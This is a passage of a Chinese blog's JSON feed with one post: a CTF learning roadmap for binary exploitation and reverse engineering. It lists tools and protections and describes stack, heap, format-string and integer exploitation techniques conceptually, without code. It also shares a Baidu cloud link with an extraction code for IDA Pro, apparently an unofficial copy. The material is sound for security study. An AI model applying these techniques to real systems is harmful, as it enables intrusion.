{
    "version": "https://jsonfeed.org/version/1",
    "title": "冷风喧嚣",
    "subtitle": "懒狗一只",
    "icon": "https://coldwinds5167.github.io/images/favicon.ico",
    "description": null,
    "home_page_url": "https://coldwinds5167.github.io",
    "items": [
        {
            "id": "https://coldwinds5167.github.io/2021/12/pwn-reserve-start/",
            "url": "https://coldwinds5167.github.io/2021/12/pwn-reserve-start/",
            "title": "二进制（pwn、reverse）学习方向",
            "date_published": "2021-12-11T15:45:55.000Z",
            "content_html": "<h1 id=\"0x00-安全素养\"><a class=\"anchor\" href=\"#0x00-安全素养\">#</a> 0x00 安全素养</h1>\n<h2 id=\"网络安全法\"><a class=\"anchor\" href=\"#网络安全法\">#</a> 网络安全法</h2>\n<p><strong>不要违法，不要违法，不要违法。</strong></p>\n<p><strong>参考资料：</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjglQUQlRTUlOEQlOEUlRTQlQkElQkElRTYlQjAlOTElRTUlODUlQjElRTUlOTIlOEMlRTUlOUIlQkQlRTclQkQlOTElRTclQkIlOUMlRTUlQUUlODklRTUlODUlQTglRTYlQjMlOTU=\">https://baike.baidu.com/item/ 中华人民共和国网络安全法</span></p>\n<h1 id=\"0x01-基础\"><a class=\"anchor\" href=\"#0x01-基础\">#</a> 0x01 基础</h1>\n<p>编程和逆向工程的能力是<strong>相当重要</strong>的。</p>\n<h2 id=\"编程语言功底\"><a class=\"anchor\" href=\"#编程语言功底\">#</a> 编程语言功底</h2>\n<ul>\n<li>\n<p>精通 C 语言（指针、函数）、C++</p>\n</li>\n<li>\n<p>汇编语言（熟悉常见指令及寄存器等，能够熟练阅读汇编代码）</p>\n</li>\n<li>\n<p>熟练使用 python</p>\n</li>\n</ul>\n<h2 id=\"逆向功底底层原理\"><a class=\"anchor\" href=\"#逆向功底底层原理\">#</a> 逆向功底 &amp; 底层原理</h2>\n<ul>\n<li>\n<p>IDA PRO 的使用（或者 Ghidra 等其它工具）</p>\n</li>\n<li>\n<p>gdb 的基本使用（断点、单步、查看内存等）</p>\n</li>\n</ul>\n<ul>\n<li>《程序员的自我修养》\n<ul>\n<li>程序的编译链接原理</li>\n<li>内存管理</li>\n<li>进程地址空间</li>\n<li>函数调用惯例</li>\n<li>…</li>\n</ul>\n</li>\n</ul>\n<ul>\n<li>…</li>\n</ul>\n<h1 id=\"0x02-二进制安全\"><a class=\"anchor\" href=\"#0x02-二进制安全\">#</a> 0x02 <strong>二进制安全</strong></h1>\n<h2 id=\"ctf\"><a class=\"anchor\" href=\"#ctf\">#</a> CTF</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcv\">https://ctf-wiki.org/</span></p>\n<p>先从 CTF 入手，学习各种漏洞类型及利用手法，不断刷题、阅读，大一大二专注在 CTF 比赛中，要求能够解决大部分常规难度的题目。</p>\n<p>学习新的题目时，不要先看 wp，要先自己去找漏洞，找漏洞是最重要的，漏洞的利用上可以跟着 wp 一步一步调试。</p>\n<p>这里有一些刷题平台：</p>\n<ul>\n<li><strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9idXVvai5jbi8=\">https://buuoj.cn/</span></strong></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYuYnVna3UuY29tLw==\">https://ctf.bugku.com/</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3RmaHViLmNvbS8jL2luZGV4\">https://www.ctfhub.com/#/index</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuLw==\">https://adworld.xctf.org.cn/</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wd25hYmxlLnR3Lw==\">https://pwnable.tw/</span></li>\n</ul>\n<h3 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h3>\n<h4 id=\"配置环境\"><a class=\"anchor\" href=\"#配置环境\">#</a> 配置环境</h4>\n<p>CTF 中接触到的 PWN 题大多属于 LINUX PWN，给电脑装 LINUX 系统比较麻烦，一般情况下是装虚拟机。</p>\n<p>如果想跳过配置环境这一步，可以直接使用 KALI LINUX，但还是建议自己装一次环境（日后可能会需要下载安装一些工具，需要会 LINUX 系统的操作）。</p>\n<p>可以参考我的另一篇文章：</p>\n<p><div class=\"links\"><div class=\"item\" title=\"Coldwinds\" style=\"--block-color:#9d5b8b;\"><a href=\"https://coldwinds5167.github.io/2021/12/pwn-environment/\" class=\"image\" data-background-image=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/avatar.jpg\"></a>\n          <div class=\"info\">\n          <a href=\"https://coldwinds5167.github.io/2021/12/pwn-environment/\" class=\"title\">冷风喧嚣</a>\n          <p class=\"desc\">pwn环境搭建</p>\n          </div></div></div></p>\n<h4 id=\"基本工具\"><a class=\"anchor\" href=\"#基本工具\">#</a> 基本工具</h4>\n<h5 id=\"逆向辅助类\"><a class=\"anchor\" href=\"#逆向辅助类\">#</a> 逆向辅助类</h5>\n<ul>\n<li>\n<p><strong>IDA PRO</strong></p>\n<blockquote>\n<p>IDA PRO 是一款很好用的反汇编工具，其反编译插件在很多时候能够将代码还原到接近源码的水平，但是 IDA 的使用比较复杂，需要自己学习。</p>\n</blockquote>\n<blockquote>\n<p>链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMVpOOEtkMlFicG5QNXFtMVFCZnhhSUE=\">https://pan.baidu.com/s/1ZN8Kd2QbpnP5qm1QBfxaIA</span><br />\n 提取码：j2my</p>\n</blockquote>\n</li>\n<li>\n<p><strong>GDB</strong></p>\n<blockquote>\n<p>GDB 是一款功能强大的程序调试工具，是动态调试必不可少的工具，可以很方便的查看堆中链表的状态，各个地址的内容。GDB 拥有多个插件（peda、pwndbg、gef 等）这些插件提供了一些额外的命令，在可视化和功能上都进行了扩展。</p>\n<p>推荐安装一个插件即可，多个插件的切换与系统环境变量相关，自行百度。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"漏洞利用类\"><a class=\"anchor\" href=\"#漏洞利用类\">#</a> 漏洞利用类</h5>\n<p>这一类工具几乎都可以在<strong> GITHUB</strong> 上下载。</p>\n<ul>\n<li>\n<p><strong>pwntools</strong></p>\n<blockquote>\n<p>pwntools 是一个 CTF 框架和漏洞利用开发库，涵盖了 pwn 题利用脚本所需要的各种工具。包括方便的 IO 交互函数，ROP、格式化字符串等利用的自动化工具，shellcode 生成器等等，是目前最好用也是仅有的大型 pwn 利用框架。能节省大量编写脚本的时间。</p>\n</blockquote>\n</li>\n<li>\n<p>ZIO</p>\n<blockquote>\n<p>ZIO 是一个专门为 CTF PWN 开发的 Python 库，基于 ZIO 可以方便实现对远程服务器上的服务程序进行数据读写操作，也支持对本地程序的数据读写操作。</p>\n</blockquote>\n</li>\n<li>\n<p>ROPgadget</p>\n<blockquote>\n<p>ROP 是一种高级的内存攻击技术，常用来绕过现代操作系统的各种通用防御。Ropgadget 用于找寻程序中用来组装 ROP 链的 gadget。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>checksec</strong></p>\n<blockquote>\n<p>查询程序架构和保护机制的开启状况。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>one_gadget</strong></p>\n<blockquote>\n<p>分析定位 libc 中获取 shell 的地址，在满足特定条件的情况下，仅拥有该地址就可以 get shell。而非手动输入 /bin/sh 和 system 的地址。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>seccomp-tools</strong></p>\n<blockquote>\n<p>分析程序中的 seccomp 安全机制开启的具体情况。</p>\n</blockquote>\n</li>\n<li>\n<p>...</p>\n</li>\n</ul>\n<h4 id=\"保护机制\"><a class=\"anchor\" href=\"#保护机制\">#</a> 保护机制</h4>\n<h5 id=\"系统选项\"><a class=\"anchor\" href=\"#系统选项\">#</a> 系统选项</h5>\n<p>ASLR：地址空间随机化 (系统选项)</p>\n<blockquote>\n<p>ASLR 有三个等级，对应系统文件中的三个值。</p>\n<p>0：关闭 ASLR。</p>\n<p>1：mmap base、stack、vdso page 将随机化，“.so” 文件会被加载到随机地址，程序的代码段加载地址将被随机化。</p>\n<p>2：在 1 的基础上增加了 heap 随机化。</p>\n<p>ASLR 保证每次程序加载的时候自身和所加载的库文件都会被映射到虚拟地址空间的不同地址处。</p>\n</blockquote>\n<h5 id=\"编译选项\"><a class=\"anchor\" href=\"#编译选项\">#</a> 编译选项</h5>\n<ul>\n<li>\n<p>NX：堆栈不可执行</p>\n<blockquote>\n<p>主要防止程序直接在非可执行的内存区（堆和栈）上运行 shellcode 代码。</p>\n</blockquote>\n</li>\n<li>\n<p>PIE：程序基地址随机化</p>\n<blockquote>\n<p>程序每个段加载出来的基地址都是随机化的。</p>\n</blockquote>\n</li>\n<li>\n<p>RELRO：重定位</p>\n<blockquote>\n<p>一般分为 partial relro 和 full relro 两种情况，前者重定位信息可写（如 GOT 表），后者不可写。</p>\n</blockquote>\n</li>\n<li>\n<p>STACK CANARY：栈溢出保护</p>\n<blockquote>\n<p>在栈的缓冲区和控制信息（如 EBP 等）间插入一个 canary word。这样，当缓冲区被溢出时，在返回地址被覆盖之前 canary word 会首先被覆盖。通过检查 canary word 的值是否被修改，就可以判断是否发生了溢出攻击，从而保护程序因为栈溢出而被攻击。</p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"常见漏洞\"><a class=\"anchor\" href=\"#常见漏洞\">#</a> 常见漏洞</h4>\n<h5 id=\"栈相关漏洞\"><a class=\"anchor\" href=\"#栈相关漏洞\">#</a> 栈相关漏洞</h5>\n<p>学习栈相关漏洞首先要对程序<strong>栈的结构</strong>，<strong>调用机制</strong>，以及函数参数传递规则（函数参数入栈出栈顺序）有一定了解。</p>\n<ul>\n<li>\n<p><strong>栈溢出</strong></p>\n<p>指栈上的缓冲区被填入了过多的数据，超出了边界，从而导致栈上原有的数据被覆盖，如果能让指定内容覆盖到某些位置，就能 get shell，通常覆盖栈的<strong>局部变量</strong>、<strong>bp</strong>（函数栈栈底指针）、<strong>ip</strong>（程序返回地址）。</p>\n<blockquote>\n<p>关于栈溢出有几个需要学习的点：</p>\n<ul>\n<li>\n<p>当开启 NX 和 CANARY 后如何执行栈溢出。</p>\n</li>\n<li>\n<p>覆盖 ip：ip 存放的是返回到父函数调用处的下一个位置，如果通过栈缓冲区用某一地址 a 覆盖了 ip，在该函数结束后，会跳转到 a 地址上，从而劫持控制流。</p>\n</li>\n<li>\n<p>覆盖栈中存储的临时变量：在知道两个变量地址偏移时，可以通过一个变量覆盖另一个变良，从而改变另一个变量。</p>\n</li>\n<li>\n<p>关注一些敏感函数：这些函数能够产生缓冲区溢出，从而实现栈溢出。</p>\n<p>常见的漏洞函数：</p>\n<ul>\n<li>gets(buff)</li>\n<li>scanf(&quot;%s&quot;,buff)</li>\n<li>...</li>\n</ul>\n<p>潜在的漏洞函数：</p>\n<ul>\n<li>read</li>\n<li>strcpy</li>\n<li>memcpy</li>\n<li>...</li>\n</ul>\n</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"栈相关漏洞的利用\"><a class=\"anchor\" href=\"#栈相关漏洞的利用\">#</a> 栈相关漏洞的利用</h5>\n<ul>\n<li>\n<p>栈的特殊利用</p>\n<ul>\n<li>\n<p>libc 信息泄露：main 函数栈底存放了返回地址，如果能泄露改返回地址，就能计算出 libc 的基址，从而得到其他函数地址。</p>\n</li>\n<li>\n<p>通过 libc 泄露栈地址：在已知 libc 地址的情况下，可以根据 libc 中的 Environ 偏移来计算栈的偏移，从而计算出栈的地址。</p>\n</li>\n<li>\n<p>往栈上写 ROP</p>\n</li>\n<li>\n<p>环境变量修改</p>\n</li>\n<li>\n<p>多级指针</p>\n</li>\n</ul>\n</li>\n<li>\n<p>栈喷射</p>\n<p>在 ROP 时无法找到确定的栈地址，便预先在栈中布置大量重复的 ROP 数据块，只要在返回时位于其中一个数据块就能实现 ROP。</p>\n<blockquote>\n<p>并非必须是 ROP，shellcode、ROP 地址等数据也可以利用栈喷射。</p>\n</blockquote>\n</li>\n<li>\n<p>栈迁移</p>\n<p>溢出的长度太短，尝试改变 sp 和 bp 寄存器的值，在新一段地址上建立栈并写入 rop 链</p>\n</li>\n<li>\n<p>线程栈</p>\n<blockquote>\n<p>现阶段了解一下即可。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"堆相关漏洞堆漏洞是ctf比赛重点\"><a class=\"anchor\" href=\"#堆相关漏洞堆漏洞是ctf比赛重点\">#</a> 堆相关漏洞（堆漏洞是 CTF 比赛重点）</h5>\n<p>堆主要指用户动态申请的内存（如调用 malloc、alloc、alloca 等函数）。</p>\n<p>学习堆相关漏洞需要了解：</p>\n<blockquote>\n<p><strong>堆基本数据结构 chunk</strong>（alloced chunk、free chunk、top chunk）。</p>\n<p><strong>堆空闲块管理结构 bin</strong>（fast bin、unsorted bin、small bin、large bin）。</p>\n<p>malloc、free 函数的基本规则，建议结合源码对照分析。</p>\n<p><strong>tcache</strong> 机制（很重要）。</p>\n</blockquote>\n<ul>\n<li>\n<p>常规堆溢出</p>\n<blockquote>\n<p>与栈溢出类似，在堆上的缓冲区被填入了过多的数据，超出了边界，导致堆中原有的数据被覆盖。通常有以下两种情况：</p>\n<ul>\n<li>覆盖本堆块内部数据：通常发生在结构体内部，如结构体中数组溢出，就会覆盖后续变量。</li>\n<li>覆盖后续堆块数据：不仅影响后续堆块的数据，还破坏了堆块的结构。</li>\n</ul>\n<p>第一种情况，参照栈溢出即可。</p>\n<p>第二种情况，有其他利用方法。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>Off By One</strong></p>\n<blockquote>\n<p>相比于常规的堆溢出，Off By One 只能溢出一字节，在 CTF 比赛中，Off By One 通常位于堆块末尾，溢出的一字节恰好能够覆盖下一堆块的 size 域的最低位，Off By One 本身比较难以利用，通常用来触发 Unlink。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>Use After Free（UAF）</strong></p>\n<blockquote>\n<p>UAF 即释放后使用漏洞，当堆指针在释放后为被置 NULL，就会形成悬挂指针，在下一次访问该指针时，仍然能够访问到原指针所指向的堆内容。UAF 的利用需要具体问题具体分析，来确定其是否能泄露信息或修改信息。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>Double Free</strong></p>\n<blockquote>\n<p>Double Free 主要指对指针存在多次释放的情况，算是 UAF 中比较特殊的一种，针对用于释放堆块的函数。对此释放能够使堆块发生重叠，前后申请的堆块可能会指向同一块内存。还可以构造特殊的堆结构，从而运用针对堆结构的利用方法。</p>\n</blockquote>\n</li>\n<li>\n<p>IO_FILE</p>\n<blockquote>\n<p>IO_FILE 本身并不是漏洞，而是程序执行 fopen 等函数时创建的结构体。在出现 House Of Orange 后，陆续出现了利用 IO_FILE 进行攻击的手法</p>\n<ul>\n<li>FSOP</li>\n<li>Vtable 劫持</li>\n<li>利用缓冲区指针达成任意读写</li>\n<li>…</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"堆相关漏洞的利用\"><a class=\"anchor\" href=\"#堆相关漏洞的利用\">#</a> 堆相关漏洞的利用</h5>\n<ul>\n<li>\n<p>Unlink</p>\n<blockquote>\n<p>Unlink 是把 free 掉的堆块从所属的 bins 链中，卸下来的操作。它是在 free 掉一块 chunk (除 fastbin 的 chunk 外）之后，glibc 检查这块 chunk 相邻的上下两块 chunk 的 free 状态之后，做出的堆块合并引起的。</p>\n<p>Unlink 攻击指的是先伪造堆块，在 free 操作时触发堆块合并，在绕过一系列检测机制后，就可以通过伪造的堆块修改其他堆块的指针，或者实现任意地址写。</p>\n</blockquote>\n</li>\n<li>\n<p>Fastbin Attack</p>\n<blockquote>\n<p>Fastbin Attack 主要针对 fastbin 的使用和释放机制，对 fastbin 的间接利用比较多。</p>\n<p>直接利用 fastbin 的方法主要是针对 fastbin 的单链表结构，更改其后续指针，控制 fastbin 在下次所要分配的堆块。</p>\n</blockquote>\n</li>\n<li>\n<p>House Of Orange</p>\n<blockquote>\n<p>使用 Unsorted Bin Attack 修改 IO_list_all 来获取 shell。</p>\n<p>学习 House Of Orange 需要理解两个概念 ——Unsorted Bin Attack 和 FSOP。</p>\n</blockquote>\n</li>\n<li>\n<p>Large bin attack</p>\n<blockquote>\n<p>覆盖 largebin 中 bk_nextsize 指针，在 largebin 插入 unsorted bin 时，可以做到往任意地址写一个堆地址的效果</p>\n</blockquote>\n</li>\n<li>\n<p>堆喷射</p>\n<blockquote>\n<p>堆喷射主要指在堆块中布置好大量重复性的数据，便于目的地址索引到堆上的数据，与栈喷射相似但更为麻烦，在真实漏洞中利用较多，而在 CTF 比赛中不常出现。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"格式化字符串漏洞\"><a class=\"anchor\" href=\"#格式化字符串漏洞\">#</a> 格式化字符串漏洞</h5>\n<p>格式化字符串漏洞主要是针对一些格式化函数（printf、sprintf、vsprintf 等）。这些格式化函数利用格式化字符串来指定串的格式。下面给出四个比较关键的格式符：</p>\n<blockquote>\n<ul>\n<li>\n<p>% x（% lx）：替换为参数的值（十六进制）。</p>\n</li>\n<li>\n<p>% p：替换为参数的值（指针形式）。</p>\n</li>\n<li>\n<p>% s：替换为参数所指向内存的字符串。</p>\n</li>\n<li>\n<p>% n：将格式化串中该特殊字符之前的字符数量写入参数中（获取地址的参数）。</p>\n</li>\n</ul>\n</blockquote>\n<p>同时还要了解参数定位。</p>\n<blockquote>\n<p>例如：printf (&quot;% p,% x&quot;,&amp;a,&amp;b);  其中的 % p 和 % x 对应第 1、2 个参数。</p>\n<p>也可以使用 &quot;% d$m&quot; 的形式来定位参数列表中第 d 个参数（从 1 开始）；其中 m 是前面所说的格式符（x、p、s、n 等）。</p>\n</blockquote>\n<h5 id=\"格式化字符串的利用\"><a class=\"anchor\" href=\"#格式化字符串的利用\">#</a> 格式化字符串的利用</h5>\n<p>格式化函数遇到格式符的关键字符后，会按照传参规则去寻找参数来进行替换或修改。如果实际参数数量小于所需参数数量，依然会将对应位置的数值当成参数进行转换，从而触发格式化字符串漏洞。</p>\n<ul>\n<li>\n<p>任意地址读</p>\n<blockquote>\n<p>通过前面所说的参数定位 “% d$m”，在确定所需信息在栈中的位置（位于第几个参数），通过参数定位可以将该信息泄露出来。</p>\n</blockquote>\n</li>\n<li>\n<p>任意地址写</p>\n<blockquote>\n<p>主要是利用格式化字符串中的 % n 对参数进行写入，写入的值是格式化字符串中 % n 之前的字符数量。</p>\n<p>% n 修改 4 字节、% hn 修改 2 字节、% hhn 修改 1 字节。</p>\n<p>可以结合 % c 来修改成特定的值，例如 &quot;%100c&quot; 会替换为宽度为 100 的字符。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"整型漏洞\"><a class=\"anchor\" href=\"#整型漏洞\">#</a> 整型漏洞</h5>\n<p>整型漏洞主要指发生在整型数据上的漏洞，整型溢出指试图保存的数据超过整型数据的宽度时发生的溢出。</p>\n<ul>\n<li>\n<p>宽度溢出</p>\n<blockquote>\n<p>整型数据在计算机中的存储一般按字节进行存储，不同的整型数据所需要的字节数也不同，“所需要的字节数” 就是该整型数据的宽度，如果数据所要表达的值大于这个宽度就会发生宽度溢出。</p>\n<p>宽度溢出主要出现在：</p>\n<ul>\n<li>\n<p>整型数据运算</p>\n</li>\n<li>\n<p>整型数据赋值</p>\n</li>\n<li>\n<p>...</p>\n</li>\n</ul>\n</blockquote>\n</li>\n<li>\n<p>符号转换</p>\n<blockquote>\n<p>符号转化通常用于：</p>\n<ul>\n<li>将无符号数和有符号数进行强制转换后数值相差过大，从而绕过条件判断。</li>\n<li>有些函数对参数有特定要求，但使用时并没有严格按照参数的类型进行参数传递。</li>\n</ul>\n</blockquote>\n</li>\n<li>\n<p>数组越界</p>\n<blockquote>\n<p>由于检查不严格，导致在对数组内存的索引时超出了数组的预设范围，从而访问到其他数据。</p>\n<p>如果可以显示数组内容，就可以实现信息泄露；如果可以修改数组内容，就可以实现信息修改。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"逻辑漏洞\"><a class=\"anchor\" href=\"#逻辑漏洞\">#</a> 逻辑漏洞</h5>\n<p>逻辑漏洞主要指程序逻辑上出现的问题，当程序逻辑不严密或者逻辑太复杂，就会导致一些逻辑分支不能正常处理或处理错误。在 PWN 题中较少出现，主要是竞态条件漏洞。</p>\n<ul>\n<li>\n<p>竞态条件漏洞</p>\n<blockquote>\n<p>竞态条件漏洞是指多任务（多进程、多线程等）对同一资源进行访问时，因访问资源的先后顺序不同产生冲突的情况，通过竞态条件漏洞可以实现越权访问、资源篡改等操作。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"其他平台漏洞\"><a class=\"anchor\" href=\"#其他平台漏洞\">#</a> 其他平台漏洞</h5>\n<ul>\n<li>IOT 漏洞</li>\n<li>虚拟机漏洞</li>\n<li>内核漏洞</li>\n<li>...</li>\n</ul>\n<h3 id=\"reverse\"><a class=\"anchor\" href=\"#reverse\">#</a> REVERSE</h3>\n<p>Reverse 即软件逆向工程，是对编译成型的二进制程序进行代码、逻辑和功能分析的过程。在 CTF 中主要考察软件静态分析和动态调试能力，常见的逆向目标为 Windows、Linux 平台下 x86、x64 二进制可执行程序。</p>\n<h4 id=\"能力要求\"><a class=\"anchor\" href=\"#能力要求\">#</a> 能力要求</h4>\n<ul>\n<li>熟悉如操作系统，汇编语言，加解密等相关知识。</li>\n<li>具有丰富的多种高级语言的编程经验。</li>\n<li>熟悉多种编译器的编译原理。</li>\n<li>较强的程序理解和逆向分析能力。</li>\n</ul>\n<h4 id=\"逆向分析的主要方法\"><a class=\"anchor\" href=\"#逆向分析的主要方法\">#</a> 逆向分析的主要方法</h4>\n<ul>\n<li>\n<p>静态分析法</p>\n<blockquote>\n<p>静态分析法是在不执行代码文件的情况下，对代码进行静态分析的一种方法，主要观察代码文件的外部特性，包括文件类型分析和静态反汇编、反编译。通常使用反汇编工具查看内部代码，分析代码结构。</p>\n</blockquote>\n</li>\n<li>\n<p>动态分析法</p>\n<blockquote>\n<p>动态分析法是在程序文件的执行过程中对代码进行动态分析的一种方法，其通过调试来分析代码、获取内存的状态等，目的在于定位关键代码后，在程序运行的过程中，借由输出信息（寄存器，内存变化，程序输出）等来验证自己的推断或是理解程序功能。通常使用调试器来分析程序的内部结构和实现原理。</p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"汇编指令体系结构\"><a class=\"anchor\" href=\"#汇编指令体系结构\">#</a> 汇编指令体系结构</h4>\n<p>逆向分析的程序所使用的处理器架构通常为 Intel 架构，所以需要对 Intel x86 和 x64 指令体系有所了解，包括：</p>\n<ul>\n<li>x86 指令体系下：\n<ul>\n<li>寄存器组</li>\n<li>汇编指令集\n<ul>\n<li>数据传送类指令</li>\n<li>栈操作与函数调用</li>\n<li>算数、逻辑运算指令</li>\n<li>控制转移指令</li>\n<li>特殊指令</li>\n</ul>\n</li>\n<li>x86 应用程序二进制接口</li>\n</ul>\n</li>\n<li>x64 指令体系下与 x86 指令体系相似，这里主要标注<strong>不同点</strong>：\n<ul>\n<li>寄存器组</li>\n<li>系统调用指令</li>\n<li>x64 应用程序二进制接口</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"基本工具-2\"><a class=\"anchor\" href=\"#基本工具-2\">#</a> 基本工具</h4>\n<h5 id=\"反汇编和反编译工具\"><a class=\"anchor\" href=\"#反汇编和反编译工具\">#</a> 反汇编和反编译工具</h5>\n<p>反汇编工具有很多，但最推荐的是<strong> IDA PRO</strong>，在反编译方面，IDA 自带的 Hex-Ray 反编译插件也是最好的。</p>\n<blockquote>\n<p>IDA 的使用比较复杂，需要自己学习。</p>\n</blockquote>\n<blockquote>\n<p>链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMVpOOEtkMlFicG5QNXFtMVFCZnhhSUE=\">https://pan.baidu.com/s/1ZN8Kd2QbpnP5qm1QBfxaIA</span><br />\n 提取码：j2my</p>\n</blockquote>\n<h5 id=\"调试工具\"><a class=\"anchor\" href=\"#调试工具\">#</a> 调试工具</h5>\n<p>调试工具有以下两个重要功能：</p>\n<ol>\n<li>\n<p>断点设置</p>\n<blockquote>\n<p>允许用户选在程序中任意位置的某行代码，一旦程序运行到这一行，将知识调试工具停止运行程序，并显示程序的当前状态。</p>\n</blockquote>\n</li>\n<li>\n<p>代码跟踪（单步调试）</p>\n<blockquote>\n<p>允许用户在程序运行时跟踪他的执行，程序每执行一条汇编代码后都会暂停，允许用户观察甚至改变程序的状态。</p>\n</blockquote>\n</li>\n</ol>\n<p>调试工具主要根据操作系统来选择</p>\n<ul>\n<li>\n<p>Windows——<strong>Ollydbg</strong></p>\n<blockquote>\n<p>Ollydbg 是 Windows 下一款具有可视化界面的用户态调试工具，推荐从吾爱破解论坛上下载吾爱破解专用版 Ollydbg，这个版本有对抗反调试的功能。</p>\n</blockquote>\n</li>\n<li>\n<p>Linux——<strong>GDB</strong></p>\n<blockquote>\n<p>GDB 是一款功能强大的程序调试工具，是动态调试必不可少的工具，可以很方便的查看堆中链表的状态，各个地址的内容。GDB 拥有多个插件（peda、pwndbg、gef 等）这些插件提供了一些额外的命令，在可视化和功能上都进行了扩展。</p>\n<p>推荐安装一个插件即可，多个插件的切换与系统环境变量相关，自行百度。</p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"trace类工具\"><a class=\"anchor\" href=\"#trace类工具\">#</a> Trace 类工具</h4>\n<p>Trace 类工具通过一定的方式监控并记录程序的运行，然后使分析者在记录的信息中得到程序的一些动态信息。</p>\n<ul>\n<li>\n<p>Strace</p>\n<blockquote>\n<p>Strace 使 Linux 下一个用来跟踪系统调用的工具，可以监控用户空间进程和内核的交互，比如系统调用、信号传递、进程状态变更等。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>Qira</strong></p>\n<blockquote>\n<p>Qira 是一个强大的 Trace 类工具，可以将程序整个执行流全部记录下来，然后给予用户<strong>回溯</strong>、查看命中断点的所有指令（即交叉引用）等。</p>\n</blockquote>\n<blockquote>\n<p>Qira 的安装比较难，多多百度 / 谷歌。</p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"常规逆向分析流程\"><a class=\"anchor\" href=\"#常规逆向分析流程\">#</a> 常规逆向分析流程</h4>\n<h5 id=\"1-收集信息\"><a class=\"anchor\" href=\"#1-收集信息\">#</a> 1、收集信息</h5>\n<p>使用 strings/file/binwalk/IDA 等静态分析工具收集信息，并根据这些静态信息进行 google/github 搜索</p>\n<h5 id=\"2-干扰分析技术\"><a class=\"anchor\" href=\"#2-干扰分析技术\">#</a> 2、干扰分析技术</h5>\n<p>程序为了保护代码，通常会使用一系列技术来干扰逆向分析，这里会介绍一些常见的干扰分析技术。</p>\n<ul>\n<li>\n<p>花指令</p>\n<blockquote>\n<p>花指令是代码保护中一种简单的技巧，原理是在原始代码中插入一段无用的或者能够干扰反汇编引擎的代码。花指令主要影响静态分析，在 IDA 中表现为一些指令无法识别，导致某些函数未能识别，从而无法对这些函数进行反编译。</p>\n</blockquote>\n<blockquote>\n<p>要破解花指令，可以在 IDA 中手动将花指令 patch 成 nop 空指令，从而去除花指令。如果程序中花指令较多，可以通过分析花指令的特定模式，编写 IDAPython 脚本对花指令进行自动化搜索和 patch。</p>\n</blockquote>\n</li>\n<li>\n<p>反调试</p>\n<blockquote>\n<p>反调试技术是指程序在运行时会检测其是否处于被调试状态，如果发现其正在被调试，就无法正常运行。</p>\n</blockquote>\n<blockquote>\n<p>Windows 下通过 Ollydbg 的 StringOD 插件可以过滤掉大多数的反调试方法。</p>\n<p>Liunx 下主要利用 ptrace 系统调用、proc 文件系统检测和父进程检测来检测自身是否正在被调试，针对这些反调试方法，常用的方法就是定位到反调试的代码，然后对程序进行 patch，在不影响程序正常功能的情况下，跳过对调试器的检测代码。</p>\n</blockquote>\n</li>\n<li>\n<p>加壳</p>\n<blockquote>\n<p>加壳是指在二进制的程序中植入一段代码。在运行的时候优先取得程序的控制权，这段代码会在执行的过程中对原始指令进行解密还原，之后再将控制权交还给原始代码，执行原来的代码。</p>\n<p>被加过壳的程序，其真正的代码是加密存放在二进制文件中的，只有在执行时才从内存中解密还原出来，因此没法对加了壳的程序直接进行静态分析。</p>\n</blockquote>\n<blockquote>\n<p>在 CTF 比赛中出现的带壳程序通常为已知的壳，大部分都可以通过使用专用工具或者脚本的脱壳。</p>\n<p>可以使用 PEiD 工具查询该带壳程序用的什么壳，再用对应工具或脚本脱壳。</p>\n</blockquote>\n</li>\n<li>\n<p>控制流混淆</p>\n<blockquote>\n<p>对于控制流混淆的程序，没有办法直接进行静态分析，也无法进行反编译，而调试器调试也会陷入控制流的跳转混乱中。</p>\n</blockquote>\n<blockquote>\n<p>对于控制流混淆的程序，通常通过 Trace 工具记录下程序运行的所有指令，然后再运行这些指令的基础上进行数据流分析。</p>\n</blockquote>\n</li>\n<li>\n<p>双进程保护（Debug 